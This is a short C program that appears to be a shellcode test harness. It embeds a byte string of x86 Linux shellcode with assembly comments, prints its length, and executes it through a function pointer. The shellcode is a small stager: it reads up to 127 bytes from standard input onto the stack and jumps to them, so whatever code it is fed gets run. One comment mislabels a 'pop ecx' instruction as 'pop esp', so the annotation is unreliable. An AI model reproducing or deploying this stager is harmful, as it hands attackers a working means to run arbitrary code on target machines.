#include<stdio.h>
#include<string.h>

unsigned char code[] = \
 
 		"\x6A\x7F"		//	push	byte	+0x7F
 		"\x5A"			//	pop		edx	
 		"\x54"			//	push	esp
 		"\x59"			//	pop		esp
 		"\x31\xDB"		//	xor		ebx,ebx
 		"\x6A\x03"		//	push	byte	+0x3
 		"\x58"			//	pop		eax
 		"\xCD\x80"		//	int		0x80
 		"\x51"			//	push	ecx
 		"\xC3";			//	ret



main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
